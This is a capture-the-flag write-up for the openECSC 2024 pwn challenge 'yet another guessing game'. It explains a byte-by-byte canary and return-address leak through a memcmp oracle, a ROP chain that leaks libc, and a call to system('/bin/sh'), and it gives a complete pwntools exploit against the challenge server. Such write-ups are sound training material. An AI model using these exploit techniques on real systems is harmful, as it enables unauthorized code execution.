---
title: yet another guessing game
type: writeup
date: 2024-05-10T16:37:39+03:00
description: Writeup for yet another guessing game [openecsc_round2_2024s]
author: zenbassi
tags:
- pwn
---
___

## Challenge Description

The title says it all. Guess the secret!

nc yetanotherguessinggame.challs.open.ecsc2024.it 38010

## Intuition

We're dealing with a very simple binary with all protections enabled:
```
RELRO           STACK CANARY      NX            PIE
Full RELRO      Canary found      NX enabled    PIE enabled 
```
Reversing it doesn't take too long. It first opens `/dev/urandom` and reads 16 bytes of random data into a buffer. After that it runs a multi-step loop. Inside the loop, the player is asked to guess the random value, and the input is checked against the random value with `memcmp`. The player receives feedback based on the result of the `memcmp`. Regardless of the restul, the player is given the option to break out of the loop or loop again.

There are a few key observations:
1. The input from the user is received through a `read` call, which attempts to read 104 bytes into a buffer of 40 bytes. By providing more than 40 bytes of data, we cause a stack-based buffer overflow;
2. The check of equality between our value and the random value is done with `memcmp`, using the length of our buffer, calculated with `strlen`. This allows us to control how much data we're checking;
    ```c
    __n = strlen(buf_vuln);
    fd = memcmp(buf_vuln,buf_ok,__n);
    ```
3. We're allowed to run the loop again, **even if** we successfully _guess the secret_;

Using this information, we notice that a loop iteration can be used as an oracle for checking the correctness of the first byte in the secret. We can try all 255 possible values until we find the right value and then continue, using the same logic, with the next bytes. We can use this technique to guess upwards of 39 bytes from the stack, which include the CANARY and the return address of the function. As such, we bypass the CANARY, which allows us to override the return address. Furthermore, by leaking the return address, we're essentially leaking an address from the address space of the binary, which in turn enables us to find the PIE slide offset and bypass ASLR.

Leaking the PIE slide offset is necessary in order to continue the attack. We don't have a **one gadget** as part of the binary, so we also need a libc leak. We can overflow another 24 bytes past the return address, which is enough to build a small ROP chain. Using ROPgadget we find a `pop rid; ret` gadget, which we'll use to call `puts@plt` on an entry from the GOT.

```
0x0000000000001503 : pop rdi ; ret
```

By printing the address of a known function from the GOT table, we can get a libc leak, which we can then use to call `system`. But before that, we need to do some more ROPing and unfortunately there's not enough overflow material. What we can do instead is obtain the libc leak and then return back to the `game` function and redo the whole process again! After guessing the new CANARY, we continue with the second part of the attack. The first part of the payload looks like this:

```py
payload = b'A' * 56 + canary + b'B' * 8
payload += p64(pop_rdi_sliced)
payload += p64(puts_got_sliced)
payload += p64(puts_sliced)
payload += p64(game_sliced)
```

For the second part of the attack, we can just use the libc offset to find the address of the system function and use it to call `/bin/sh`. The payload looks like this. [libc.blukat](https://libc.blukat.me/) is a very useful tool for getting the relative offsets of functions or even the `/bin/sh` string from libc. Here is the second part of the payload

```py
payload = b'A' * 56 + canary + b'B' * 8
payload += p64(pop_rdi_sliced)
payload += p64(bin_sh)
payload += p64(ret) # use this to align the stack for system
payload += p64(system_sliced)
```

## Solution

Here is the full exploit:

```python
#! /usr/bin/env python3

from pwn import *

# p = process('./yet_another_guessing_game/build/yet_another_guessing_game')
# p = process(['./yet_another_guessing_game/libs/ld-linux-x86-64.so.2', \
#             './yet_another_guessing_game/build/yet_another_guessing_game'], \
#             env={"LD_PRELOAD": './yet_another_guessing_game/libs/libc.so.6'})

p = remote('yetanotherguessinggame.challs.open.ecsc2024.it', 38010)

def runda(payload, act=b'y'):
    p.recvuntil(b'et!\n')
    p.send(payload)
    re = p.recvline()
    ret = None
    if b'win' in re:
        ret = True
    else:
        ret = False
    p.recvline()
    p.send(act)
    return ret


def bruteforce():
    runda(b'A' * 57)

    buf_ok = b'A' * 16
    canary = b'A'
    for _ in range(7):
        for b in range(1, 256):
            payload = buf_ok + canary + b.to_bytes() + b'\0'
            ret = runda(payload)
            if ret:
                canary += b.to_bytes()
                break

    assert(len(canary) == 8)

    rbp = b'B' * 8
    runda(b'A' * 56 + canary + rbp)

    ret_addr = b''
    for _ in range(7):
        for b in range(1, 256):
            payload = buf_ok + canary + rbp + ret_addr + b.to_bytes() + b'\0'
            ret = runda(payload)
            if ret:
                ret_addr += b.to_bytes()
                break

    ret_addr = ret_addr[::-1]
    # print("return address: ", hex(int.from_bytes(ret_addr)))

    # payload = buf_ok + canary + rbp + ret_addr

    canary = b'\0' + canary[1:]
    runda(b'A' * 56 + canary) # repair the canary with the 0 byte

    ret_offset = 0x101483
    pie_slice = int.from_bytes(ret_addr) - ret_offset
    # print(hex(pie_slice))

    return canary, pie_slice

canary, pie_slice = bruteforce()
game_sliced = 0x0010128f + pie_slice
puts_sliced = 0x001010e0 + pie_slice
puts_got_sliced = 0x00103f88 + pie_slice
pop_rdi_sliced = 0x001503 + 0x100000 + pie_slice
ret = 0x101a + 0x100000 + pie_slice

payload = b'A' * 56 + canary + b'B' * 8
payload += p64(pop_rdi_sliced)
payload += p64(puts_got_sliced)
payload += p64(puts_sliced)
payload += p64(game_sliced)
runda(payload, b'n')
p.recvline() # skip

puts_libc = p.recvline().rstrip() + b'\0\0'
# print(puts_libc)
puts_libc_addr = u64(puts_libc)
print(hex(puts_libc_addr))

# gdb.attach(p)
# pause()

canary, pie_slice = bruteforce()
# system_sliced = puts_libc_addr - 174656
system_sliced = puts_libc_addr - 205200
# bin_sh = puts_libc_addr + 0x1217b8
bin_sh = puts_libc_addr + 1245597

payload = b'A' * 56 + canary + b'B' * 8
payload += p64(pop_rdi_sliced)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system_sliced)

runda(payload, b'n')

# gdb.attach(p)
# pause()

p.recvline() # skip

p.interactive()
```

### Flag

`openECSC{y3t_an0th3r_br0ken_gu3ssing_g4me_<3.hidden}`
